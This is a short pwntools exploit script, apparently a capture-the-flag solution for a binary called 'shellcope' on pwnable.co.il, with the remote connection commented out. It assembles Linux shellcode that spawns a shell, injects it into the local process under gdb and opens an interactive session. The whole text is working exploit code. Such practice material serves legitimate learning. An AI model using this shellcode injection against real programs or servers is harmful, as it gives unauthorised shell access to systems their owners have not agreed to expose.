from pwn import * 


payload = asm(shellcraft.linux.sh())
elf = ELF('./shellcope')
context.binary = elf
context.log_level = 'DEBUG'
libc = elf.libc 

# p = remote('pwnable.co.il', 9001)
p = process()
gdb.attach(p)
p.send(payload)
p.interactive()